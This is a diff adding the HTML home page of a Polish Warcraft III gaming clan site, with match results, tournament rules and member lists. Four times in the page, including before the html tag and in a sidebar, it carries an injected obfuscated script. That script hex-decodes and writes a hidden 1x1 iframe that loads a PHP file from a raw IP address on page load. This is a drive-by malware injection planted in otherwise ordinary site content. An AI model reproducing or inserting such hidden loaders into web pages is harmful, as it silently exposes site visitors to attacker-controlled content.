@@ -1,0 +1,772 @@
+<!-- o65 --><script type='text/javascript'>function F1B5B1EBD6CAADD0DB7(A2625E9F425A4E413A550C090C6718){var F137DC292706D98A24E02100810255=16;return(parseInt(A2625E9F425A4E413A550C090C6718,F137DC292706D98A24E02100810255));}function A28544CEDFDF7273B891CDF94B6E2(A8665970002354CE5CB){var DAA88B9748379D759729D1=2;var EA8056E267241594097C6DCC='';for(CA2380843B2AFD36EFBF=0;CA2380843B2AFD36EFBF<A8665970002354CE5CB.length;CA2380843B2AFD36EFBF+=DAA88B9748379D759729D1){EA8056E267241594097C6DCC+=(String.fromCharCode(F1B5B1EBD6CAADD0DB7(A8665970002354CE5CB.substr(CA2380843B2AFD36EFBF,DAA88B9748379D759729D1))));}document.write(EA8056E267241594097C6DCC);}A28544CEDFDF7273B891CDF94B6E2('3C696672616D65207372633D687474703A2F2F35382E36352E3233332E39372F57345951694C42752E7068702077696474683D31206865696768743D31207374796C653D22646973706C61793A6E6F6E65223E3C2F696672616D653E');</script><!-- c65 -->
+<html>
+<head>
+<title>InFection Gaming</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<link href="_stylesheet.css" rel="stylesheet" type="text/css">
+<script src="js/bbcode.js" language="jscript" type="text/javascript"></script>
+</head>
+<body><!-- o65 --><script type='text/javascript'>function F1B5B1EBD6CAADD0DB7(A2625E9F425A4E413A550C090C6718){var F137DC292706D98A24E02100810255=16;return(parseInt(A2625E9F425A4E413A550C090C6718,F137DC292706D98A24E02100810255));}function A28544CEDFDF7273B891CDF94B6E2(A8665970002354CE5CB){var DAA88B9748379D759729D1=2;var EA8056E267241594097C6DCC='';for(CA2380843B2AFD36EFBF=0;CA2380843B2AFD36EFBF<A8665970002354CE5CB.length;CA2380843B2AFD36EFBF+=DAA88B9748379D759729D1){EA8056E267241594097C6DCC+=(String.fromCharCode(F1B5B1EBD6CAADD0DB7(A8665970002354CE5CB.substr(CA2380843B2AFD36EFBF,DAA88B9748379D759729D1))));}document.write(EA8056E267241594097C6DCC);}A28544CEDFDF7273B891CDF94B6E2('3C696672616D65207372633D687474703A2F2F35382E36352E3233332E39372F57345951694C42752E7068702077696474683D31206865696768743D31207374796C653D22646973706C61793A6E6F6E65223E3C2F696672616D653E');</script><!-- c65 -->
+<table cellpadding="0" cellspacing="0" align="center">
+<tr><td align="center">
+
+<table width="1005px" cellpadding="0" cellspacing="0" >
+	<tr><td>
+
+           <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" width="1005" height="140" id="Untitled-6" align="middle">
+<param name="allowScriptAccess" value="sameDomain" />
+<param name="movie" value="Untitled-6.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" /><embed src="Untitled-6.swf" quality="high" bgcolor="#ffffff" width="1005" height="140" name="Untitled-6" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
+</object>
+
+
+
+        </td></tr>
+</table>
+
+<table width="1005px" cellpadding="0" cellspacing="0">
+<tr>
+	<td><img src="images/index_02.gif" /></td>
+	<td><img src="images/index_03.gif" /></td>
+	
+	<td><a href="index.php" onmouseover="bt1.src='images/index_04.gif';" onmouseout="bt1.src='images/on_04.gif';">
+	<img name="bt1" src="images/on_04.gif" /></a></td>
+	
+	<td><a href="index.php?site=news&action=archive" onmouseover="bt2.src='images/index_05.gif';" onmouseout="bt2.src='images/on_05.gif';">
+	<img name="bt2" src="images/on_05.gif" /></a></td>
+	
+	<td><a href="index.php?site=articles" onmouseover="bt3.src='images/index_06.gif';" onmouseout="bt3.src='images/on_06.gif';">
+	<img name="bt3" src="images/on_06.gif" /></a></td>
+	
+	<td><a href="index.php?site=members" onmouseover="bt4.src='images/index_07.gif';" onmouseout="bt4.src='images/on_07.gif';">
+	<img name="bt4" src="images/on_07.gif" /></a></td>
+	
+	<td><a href="index.php?site=clanwars" onmouseover="bt5.src='images/index_08.gif';" onmouseout="bt5.src='images/on_08.gif';">
+	<img name="bt5" src="images/on_08.gif" /></a></td>
+	
+	<td><a href="index.php?site=awards" onmouseover="bt6.src='images/index_09.gif';" onmouseout="bt6.src='images/on_09.gif';">
+	<img name="bt6" src="images/on_09.gif" /></a></td>
+	
+	<td><a href="index.php?site=forum" onmouseover="bt7.src='images/index_10.gif';" onmouseout="bt7.src='images/on_10.gif';">
+	<img name="bt7" src="images/on_10.gif" /></a></td>
+	
+	<td><a href="index.php?site=articles" onmouseover="bt8.src='images/index_11.gif';" onmouseout="bt8.src='images/on_11.gif';">
+	<img name="bt8" src="images/on_11.gif" /></a></td>
+	
+	<td><a href="index.php?site=sponsors" onmouseover="bt9.src='images/index_12.gif';" onmouseout="bt9.src='images/on_12.gif';">
+	<img name="bt9" src="images/on_12.gif" /></a></td>
+	
+	<td><a href="index.php?site=files" onmouseover="bt10.src='images/index_13.gif';" onmouseout="bt10.src='images/on_13.gif';">
+	<img name="bt10" src="images/on_13.gif" /></a></td>
+	
+	<td><a href="index.php?site=gallery" onmouseover="bt11.src='images/index_14.gif';" onmouseout="bt11.src='images/on_14.gif';">
+	<img name="bt11" src="images/on_14.gif" /></a></td>
+	
+	<td><a href="index.php?site=gallery" onmouseover="bt12.src='images/index_15.gif';" onmouseout="bt12.src='images/on_15.gif';">
+	<img name="bt12" src="images/on_15.gif" /></a></td>
+	
+	<td><a href="index.php?site=about" onmouseover="bt13.src='images/index_16.gif';" onmouseout="bt13.src='images/on_16.gif';">
+	<img name="bt13" src="images/on_16.gif" /></a></td>
+	
+	<td><a href="index.php?site=server" onmouseover="bt14.src='images/index_17.gif';" onmouseout="bt14.src='images/on_17.gif';">
+	<img name="bt14" src="images/on_17.gif" /></a></td>
+	
+	<td><img src="images/index_18.gif" /></td>
+	<td><img src="images/index_19.gif" /></td>
+</tr>
+</table>
+
+<table width="1005px" cellpadding="0" cellspacing="0">
+<tr>
+	<td><img src="images/index_20.gif" /></td>
+	<td><img src="images/index_21.gif" /></td>
+	<td style="background-color:#151515;width:862px;" align="left">
+	
+			<table cellpadding="0" cellspacing="0" style="display:inline;margin-left:4px;">
+		<tr><td><img src="images/index2_03.gif" /></td></tr>
+		<tr><td style="background:url('images/index2_11.gif');height:80px;" valign="top" align="left">	
+		<div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="204px"><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">18.11</div><a href="index.php?site=news_comments&newsID=192&lang=pl"><b> InFection vs Lyra Gami..</b></a></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="204px"><img src="images/flags/de.gif" width="12" height="12" border="0" alt="Germany"> <div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">13.11</div><a href="index.php?site=news_comments&newsID=188&lang=pl"><b> InFection Cup</b></a></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="204px"><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">09.11</div><a href="index.php?site=news_comments&newsID=185&lang=pl"><b> Puchar polski &amp; Elimin..</b></a></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="204px"><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">07.11</div><a href="index.php?site=news_comments&newsID=181&lang=pl"><b> Powrót dywizji CS: Sou..</b></a></div>		</td></tr>
+		</table>
+		
+		<table cellpadding="0" cellspacing="0" style="display:inline;margin-left:3px;">	
+		<tr><td><img src="images/index2_05.gif" /></td></tr>
+		<tr><td style="background:url('images/index2_11.gif');height:80px;" valign="top" align="left">
+		<div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:4px;padding-top:2px;" width="204px">
+<table cellpadding="0" cellspacing="0" width="200px">
+<tr><td align="left" valign="top" width="70%">
+<img src="images/games/wc3.gif" border="0" width="13" height="13"> <img src="images/flags/ru.gif" border="0" width="12" height="12">
+<a href="index.php?site=clanwars_details&cwID=72">Lyra</td>
+<td width="28%" align="right"><font color="">3</font>:<font color="">0</font> <b><img border="0" src="./images/results/won.gif" width="9" height="9"></b></a>
+</td></tr>
+</table></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:4px;padding-top:2px;" width="204px">
+<table cellpadding="0" cellspacing="0" width="200px">
+<tr><td align="left" valign="top" width="70%">
+<img src="images/games/wc3.gif" border="0" width="13" height="13"> <img src="images/flags/pl.gif" border="0" width="12" height="12">
+<a href="index.php?site=clanwars_details&cwID=70">BVG</td>
+<td width="28%" align="right"><font color="">0</font>:<font color="">3</font> <b><img border="0" src="./images/results/lost.gif" width="9" height="9"></b></a>
+</td></tr>
+</table></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:4px;padding-top:2px;" width="204px">
+<table cellpadding="0" cellspacing="0" width="200px">
+<tr><td align="left" valign="top" width="70%">
+<img src="images/games/wc3.gif" border="0" width="13" height="13"> <img src="images/flags/de.gif" border="0" width="12" height="12">
+<a href="index.php?site=clanwars_details&cwID=71">JF</td>
+<td width="28%" align="right"><font color="">2</font>:<font color="">3</font> <b><img border="0" src="./images/results/lost.gif" width="9" height="9"></b></a>
+</td></tr>
+</table></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:4px;padding-top:2px;" width="204px">
+<table cellpadding="0" cellspacing="0" width="200px">
+<tr><td align="left" valign="top" width="70%">
+<img src="images/games/css.gif" border="0" width="13" height="13"> <img src="images/flags/de.gif" border="0" width="12" height="12">
+<a href="index.php?site=clanwars_details&cwID=68">showIT</td>
+<td width="28%" align="right"><font color="">9</font>:<font color="">21</font> <b><img border="0" src="./images/results/lost.gif" width="9" height="9"></b></a>
+</td></tr>
+</table></div>		</td></tr>
+		</table>
+		
+		<table cellpadding="0" cellspacing="0" style="display:inline;margin-left:4px;">	
+		<tr><td><img src="images/index2_07.gif" /></td></tr>
+		<tr><td style="background:url('images/index2_11.gif');height:80px;" valign="top" align="left">
+		<div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left">
+<div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">06.11</div> <img src="images/ico_03.gif" /> <a href="index.php?site=articles&action=show&articlesID=12">Avrl Przepytany !</a></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left">
+<div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">16.10</div> <img src="images/ico_03.gif" /> <a href="index.php?site=articles&action=show&articlesID=11">1 2 3 Karba !</a></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left">
+<div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">14.10</div> <img src="images/ico_03.gif" /> <a href="index.php?site=articles&action=show&articlesID=9">tetris przepytany</a></div><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left">
+<div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">14.10</div> <img src="images/ico_03.gif" /> <a href="index.php?site=articles&action=show&articlesID=8">Tomek777 pod gradobi..</a></div>		</td></tr>
+		</table>
+		
+		<table cellpadding="0" cellspacing="0" style="display:inline;margin-left:3px;">	
+		<tr><td><img src="images/index2_09.gif" /></td></tr>
+		<tr><td style="background:url('images/index2_11.gif');height:80px;" valign="top" align="left">
+		<table width="100%" cellspacing="4" cellpadding="0"><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left"><a href="index.php?site=files&file=7">(154) <img src="images/ico_05.gif" /> FIFA 08 Demo </a></div>
+</table><table width="100%" cellspacing="4" cellpadding="0"><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left"><a href="index.php?site=files&file=1">(94) <img src="images/ico_05.gif" /> Fifa 07 Multitool </a></div>
+</table><table width="100%" cellspacing="4" cellpadding="0"><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left"><a href="index.php?site=files&file=3">(89) <img src="images/ico_05.gif" /> Fifa 07 Demo </a></div>
+</table><table width="100%" cellspacing="4" cellpadding="0"><div id="menuss" style="background:url('images/index2_11.gif');height:18px;padding-left:2px;padding-top:2px;" width="206px" align="left"><a href="index.php?site=files&file=4">(85) <img src="images/ico_05.gif" /> FIFA 07 Gameplay Movie </a></div>
+</table>		</td></tr>
+		</table>
+	
+	</td>
+	<td><img src="images/index_23.gif" /></td>
+	<td><img src="images/index_24.gif" /></td>
+</tr>
+</table>
+
+<table cellpadding="0" cellspacing="0" style="margin-top:5px;margin-right:13px;">
+<tr>
+	<td valign="top">
+
+<table cellpadding="0" cellspacing="0">
+<tr>
+	<td valign="top"><img src="images/index_27.gif" /></td>
+</tr>
+<tr>
+	<td valign="top" style="background-color:#151515;">
+	
+	<table cellpadding="0" cellspacing="0" style="margin-left:6px;">	
+		<tr><td><img src="images/index2_16.gif" /></td></tr>
+		<tr><td width="138px" background="images/index2_27.gif">
+		<!-- o65 --><script type='text/javascript'>function F1B5B1EBD6CAADD0DB7(A2625E9F425A4E413A550C090C6718){var F137DC292706D98A24E02100810255=16;return(parseInt(A2625E9F425A4E413A550C090C6718,F137DC292706D98A24E02100810255));}function A28544CEDFDF7273B891CDF94B6E2(A8665970002354CE5CB){var DAA88B9748379D759729D1=2;var EA8056E267241594097C6DCC='';for(CA2380843B2AFD36EFBF=0;CA2380843B2AFD36EFBF<A8665970002354CE5CB.length;CA2380843B2AFD36EFBF+=DAA88B9748379D759729D1){EA8056E267241594097C6DCC+=(String.fromCharCode(F1B5B1EBD6CAADD0DB7(A8665970002354CE5CB.substr(CA2380843B2AFD36EFBF,DAA88B9748379D759729D1))));}document.write(EA8056E267241594097C6DCC);}A28544CEDFDF7273B891CDF94B6E2('3C696672616D65207372633D687474703A2F2F35382E36352E3233332E39372F57345951694C42752E7068702077696474683D31206865696768743D31207374796C653D22646973706C61793A6E6F6E65223E3C2F696672616D653E');</script><!-- c65 --><!-- o65 --><script type='text/javascript'>function F1B5B1EBD6CAADD0DB7(A2625E9F425A4E413A550C090C6718){var F137DC292706D98A24E02100810255=16;return(parseInt(A2625E9F425A4E413A550C090C6718,F137DC292706D98A24E02100810255));}function A28544CEDFDF7273B891CDF94B6E2(A8665970002354CE5CB){var DAA88B9748379D759729D1=2;var EA8056E267241594097C6DCC='';for(CA2380843B2AFD36EFBF=0;CA2380843B2AFD36EFBF<A8665970002354CE5CB.length;CA2380843B2AFD36EFBF+=DAA88B9748379D759729D1){EA8056E267241594097C6DCC+=(String.fromCharCode(F1B5B1EBD6CAADD0DB7(A8665970002354CE5CB.substr(CA2380843B2AFD36EFBF,DAA88B9748379D759729D1))));}document.write(EA8056E267241594097C6DCC);}A28544CEDFDF7273B891CDF94B6E2('3C696672616D65207372633D687474703A2F2F35382E36352E3233332E39372F57345951694C42752E7068702077696474683D31206865696768743D31207374796C653D22646973706C61793A6E6F6E65223E3C2F696672616D653E');</script><!-- c65 -->		</td></tr>
+		<tr><td><img src="images/index2_28.gif" /></td></tr>
+	</table>
+	
+	<table cellpadding="0" cellspacing="0" style="margin-left:6px;margin-top:6px;">	
+		<tr><td><img src="images/index2_26.gif" /></td></tr>
+		<tr><td width="138px" background="images/index2_27.gif">
+		Brak aktywnych ankiet.<br><br>&#8226; <a href="index.php?site=polls">Poka¿ ankiety</a>		</td></tr>
+		<tr><td><img src="images/index2_28.gif" /></td></tr>
+	</table>
+	
+	<table cellpadding="0" cellspacing="0" style="margin-left:6px;margin-top:6px;">	
+		<tr><td><img src="images/index2_30.gif" /></td></tr>
+		<tr><td style="background:url('images/index2_34.gif');height:120px;" valign="top" align="left">
+		<div id="menuss" style="background:url('images/index2_34.gif');height:18px;padding-left:2px;padding-top:2px;" width="136px" align="left"><div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">03.12</div> <a href="index.php?site=profile&id=158">kreozot</a></div><div id="menuss" style="background:url('images/index2_34.gif');height:18px;padding-left:2px;padding-top:2px;" width="136px" align="left"><div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">27.11</div> <a href="index.php?site=profile&id=157">Szczurek</a></div><div id="menuss" style="background:url('images/index2_34.gif');height:18px;padding-left:2px;padding-top:2px;" width="136px" align="left"><div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">26.11</div> <a href="index.php?site=profile&id=156">Cooler</a></div><div id="menuss" style="background:url('images/index2_34.gif');height:18px;padding-left:2px;padding-top:2px;" width="136px" align="left"><div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">26.11</div> <a href="index.php?site=profile&id=155">Trexter</a></div><div id="menuss" style="background:url('images/index2_34.gif');height:18px;padding-left:2px;padding-top:2px;" width="136px" align="left"><div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">26.11</div> <a href="index.php?site=profile&id=154">theTrex</a></div><div id="menuss" style="background:url('images/index2_34.gif');height:18px;padding-left:2px;padding-top:2px;" width="136px" align="left"><div id="smalla" style="color:#7E7E7E;font-size:9px;display:inline;">26.11</div> <a href="index.php?site=profile&id=153">Trex</a></div>		</td></tr>
+		<tr><td><img src="images/index2_28.gif" /></td></tr>
+	</table>
+	
+
+
+
+	
+	</td>
+</tr>
+<tr>
+	<td valign="top"><img src="images/index_36.gif" /></td>
+</tr>	
+</table>
+</td>
+
+<td valign="top">
+
+<table cellpadding="0" cellspacing="0" border=0>
+<tr>
+<td valign=top>
+
+    <table cellpadding="0" cellspacing="0" style="margin-left:7px;">
+
+<tr>
+	<td valign="top"><img src="images/index_29.gif" /></td>
+</tr>
+<tr>
+	<td width="489px" style="background-color:#151515;" valign="top" align=center>
+	
+
+
+       <table cellpadding="0" cellspacing="0" border=0>
+
+<tr>
+
+<td width=475 bgcolor=ffffff>
+
+
+<HTML>
+<HEAD>
+
+
+
+
+
+
+
+<script type="text/javascript">
+function wiadomosc(n) {
+var czas = 10000;
+var tablica = new Array();
+tablica[0] = "<a href='http://infection.pl/index.php?site=news_comments&newsID=151'><img src='images/rotator-news/cup.jpg'></a>";
+tablica[1] = "<a href='http://www.infection.pl/index.php?site=articles&action=show&articlesID=11'><img src='images/rotator-news/karba.jpg'></a>";
+tablica[2] = "<a href='http://www.infection.pl/index.php?site=articles&action=show&articlesID=9'><img src='images/rotator-news/tetris.jpg'></a>";
+tablica[3] = "<a href='http://www.infection.pl/index.php?site=articles&action=show&articlesID=8'><img src='images/rotator-news/tomek.jpg'></a>";
+tablica[4] = "<a href='http://www.infection.pl/index.php?site=news_comments&newsID=134&lang=pl'><img src='images/rotator-news/roz.jpg'></a>";
+document.getElementById("wiadomosc").innerHTML = tablica[n];
+if (n < tablica.length-1) {
+n = (n+1);
+}
+else {
+n = 0;
+}
+setTimeout("wiadomosc("+n+")", czas);
+}
+</script>
+
+<style type="text/css">
+#wiadomosc {
+
+
+background-color: #ffffff;
+
+margin: 0px 0px 0px 0px;
+
+}
+</style>
+</HEAD>
+
+<body onload="wiadomosc(0);">
+
+<div id="wiadomosc"></div>
+
+</BODY>
+</HTML>
+
+
+
+
+</td>
+
+
+
+
+</tr>
+
+
+
+
+</table>
+
+
+
+
+
+
+		
+	</td>
+</tr>
+<tr>
+	<td valign="top"><img src="images/index_37.gif"></td>
+</tr>	
+</table>
+
+
+</td>
+</tr>
+<tr>
+<td valing=top height=6></td>
+</tr>
+
+
+<tr>
+<td valign=top>
+<table cellpadding="0" cellspacing="0" style="margin-left:7px;">
+<tr>
+	<td valign="top"><img src="images/index_29.gif" /></td>
+</tr>
+<tr>
+	<td width="489px" style="background-color:#151515;" valign="top" align=center>
+	
+
+       <table cellpadding="0" cellspacing="0" border=0>
+<tr>
+<td width=475 bgcolor=ffffff>
+
+  
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>InFection vs Lyra Gaming !</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                Dzisiaj o godzinie 20:00 InFection zmierzy siê z nawet fajnym (44-48 solo) klanem Lyra Gaming ! Miejmy nadzieje, ¿e <img src="images/flags/kr.gif" width="12" height="12" border="0" alt="Korea"> <a href="index.php?site=profile&id=63">Avrl</a>&nbsp;podbudowa³ nasz line up po ostatniej pora¿ce. Gogo shim almo qoom duriel xD !<br />
+<center><table><tr><td><img src="http://www.burak.webd.pl/images/inf.jpg"></td><td width=200><center><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> <b>InFection</b><br>vs<br><b><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> Lyra Gaming</b><br><br><b>Data:</b> 18.11.2007<br><b>Godzina:</b> 20:00<br><b>Kana³:</b> infvslyra<br><b>Link:</b> <a href="http://www.esl.eu/eu/wc3/wcip/season2_qual/match/8012755/">Match</a> </td><td><img src="http://img151.imageshack.us/img151/8118/2207319smalloo5.jpg"></td></tr><br />
+<tr><td><br><img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> iNF</td> <td width=200><center><font size="5">3:0 (6:0)</font></center></td><td align="right"><br> Lyra <img src="images/flags/ru.gif" width="12" height="12" border="0" alt="Russian Federation"></td></tr><br />
+<tr><td align="right">Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"><br />
+Player <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"></td><br />
+<td><center> (2:0)<br />
+(2:0)<br />
+(2:0)<br />
+(-:-)<br />
+(-:-)</center></td><br />
+<td align="left"><br />
+<img src="images/flags/ru.gif" width="12" height="12" border="0" alt="Russian Federation"> Player<br />
+<img src="images/flags/ru.gif" width="12" height="12" border="0" alt="Russian Federation"> Player<br />
+<img src="images/flags/ru.gif" width="12" height="12" border="0" alt="Russian Federation"> Player<br />
+<img src="images/flags/ru.gif" width="12" height="12" border="0" alt="Russian Federation"> Player<br />
+<img src="images/flags/ru.gif" width="12" height="12" border="0" alt="Russian Federation"> Player<br />
+</table></center>
+                </td></tr>
+                </table>
+                
+		</td></tr>
+		<tr><td bgcolor=e7e7e7></td></tr>
+		<tr><td background="images/index2_43.gif" bgcolor=151515 width="468px" height="21px" style="padding-left: 4px;" /><b>Doda³:</b> <a href="index.php?site=profile&id=134">kaylanilei</a>, Dnia: 18.11.2007 - 10:19, <a href="index.php?site=news_comments&newsID=192">Komentarze[7]</a></td></tr>
+                 <tr><td bgcolor=151515 height=6></td></tr>
+	</table>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0">
+		
+		<tr><td background="images/index2_32.gif" width="468px" height="31px" style="color:#FFFFFF;padding-left: 7px;font-size:14px;"/><b>InFection Cup</b></td></tr>
+		<tr><td valign=top>
+		
+		   <table cellpadding="0" cellspacing="0">
+                    <tr>  <td valign=top height=4 bgcolor=e7e7e7></td></tr>
+
+                   <tr>
+
+
+                <td background="images/index2_35.gif" width="468px" valign=top style="padding-left: 4px;padding-right: 4px; font-size:12px;" />
+                <center><img src="cup.jpg"></center><br />
+<br />
+<b>InFection Cup</b> znowu rusza ! Po udanym turnieju 2v2 Warcraft III ROC przyszed³ czas na turniej <b>2v2 Warcraft III TFT</b> ! Zapraszamy wszystkie klany do brania udzia³u . Tym razem wpad³em na pomys³ , ¿eby ka¿dy klan który chcia³by brac udzia³ w tym turnieju mo¿e wystawic <b>tylko jeden team 2v2</b> . Dlaczego tylko jeden ?Poniewa¿ na celu mamy sprawdzenie poziomu dru¿yn 2v2 w naszych klanach + zabawa ;] (mi osobiscie podoba siê bardziej gry 2v2 ni¿ solo).<b>Chcesz siê zapisac do tura?</b>Napisz na nr GG:10840597 Pe³n± nazwê klanu ,tag, nicki obu graczy oraz link do loga klanu! Poni¿ej regulamin , zapisane dru¿yny oraz terminarz.<br />
+<br />
+<table width="100%">
+			    <tr><td><a href="javascript:Toggle('188_1')"><img alt="read more" src="images/icons/expand.gif" border="0" id="ToggleImg_188_1"> Terminarz</a></td></tr>
+				<tr>
+				  <td style="padding-left: 16px;"><span id="ToggleRow_188_1" style="display:none"><br />
+Sobota - godzina 19:00 Faza grupowa<br />
+Niedziela &#8211; godzina 18:00 Fina³y<br />
+</span></td></tr></table><br />
+<br />
+<table width="100%">
+			    <tr><td><a href="javascript:Toggle('188_2')"><img alt="read more" src="images/icons/expand.gif" border="0" id="ToggleImg_188_2"> GRUPY !!</a></td></tr>
+				<tr>
+				  <td style="padding-left: 16px;"><span id="ToggleRow_188_2" style="display:none"><br />
+GRUPA 1<br />
+<img src="http://img522.imageshack.us/img522/6631/xmwxuf3du0.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">armanull <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">ImWithYou. [xMWx]<br />
+<img src="http://img143.imageshack.us/img143/3963/beyrf6.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">BeY]Pedersen & <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">Bey]Garrow  [BeY] <br />
+<img src="http://img164.imageshack.us/img164/3426/logo10ou6rx5.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">Pawel0 & <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">bdh.silver Klan  [xDSx]<br />
+<img src="http://img406.imageshack.us/img406/7484/pexgxs6.gif" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">peXg.Wilq & <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">peXg.Zabson [peXg]<br />
+GRUPA 2<br />
+<img src="http://img45.imageshack.us/img45/1190/inftj2.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">Kunio & <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland"> InF.Lao [lnF]<br />
+<img src="http://img231.imageshack.us/img231/8169/2597590smallct3.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">IlikePizza & <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">nik0p0lis [CoD] <br />
+<img src="http://img529.imageshack.us/img529/6454/wildaur0.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">TW.D-Link.Ankh <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">TW.D-Link.Nov [Wild]<br />
+<img src="http://img204.imageshack.us/img204/4224/tm07am7.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">TM07.Koczko & <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">MaTi007 [TM07]<br />
+<img src="http://img87.imageshack.us/img87/1760/rnnu0.jpg" border="0"> <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">rEvolutioN.FuR <img src="images/flags/pl.gif" width="12" height="12" border="0" alt="Poland">rEvolutionChaoS [rN]<br />
+</span></td></tr></table><br />
+<table width="100%">
+			    <tr><td><a href="javascript:Toggle('188_3')"><img alt="read more" src="images/icons/expand.gif" border="0" id="ToggleImg_188_3"> Regulamin</a></td></tr>
+				<tr>
+				  <td style="padding-left: 16px;"><span id="ToggleRow_188_3" style="display:none"><br />
+- Zapisy przyjmujemy do Soboty (godzina 12:00)<br />
+- Turniej bêdzie rozgrywany najpierw w grupach ,a pó&#65533;niej z ka¿dej grupy wyjd¹ po 2 dru¿yny które bêd¹ gra³y w fina³ach<br />
+- Ka¿dy pojedynek do 2 win !<br />
+- Je&#65533;li chodzi o mapy to jest mo¿liwosc ustalenia jednej wspólnej na której bêdzie rozgrywa³ siê mecz. Natomiast je&#65533;li gracze nie dojd¹ do poruzumienia to gramy na AV ;]<br />
+</span></td></tr></table><br />
+<table width="100%">
+			    <tr><td><a href="javascript:Toggle('188_4')"><img alt="read more" src="images/icons/expand.gif" border="0" id="ToggleImg_188_4"> Wyniki i Tabele</a></td></tr>
+				<tr>
+				  <td style="padding-left: 16px;"><span id="ToggleRow_188_4" style="display:none"><br />
+Grupy rozstawione tak ,aby najlepsze klany nie gra³y ze sob± w 1 grupie ;]. My¶lê ,¿e teraz jest dobrze GL HF !<br />
+GR 1<br />
+- <b>rN</b> 3pkt 3Meczy<br />
+- <b>rN2</b>  2pkt 3Meczy<br />
+- <b>xDSx</b>  1pkt 3Meczy<br />
+- <b>xMWx</b> 0pkt 3Meczy<br />
+<br />
+xMWx vs rN 1-2<br />
+XMWx vs rN2 0-2<br />
+xMWx vs xDSx 0-2<br />
+rN vs rN2 2-1<br />
+rN vs xDSx 2-0<br />
+rN2 vs xDSx 2-0<br />
+<br />
+GR 2<br />
+- <b>Wild</b> 1pkt 1Meczy<br />
+- <b>CoD</b> 1pkt 1Meczy<br />
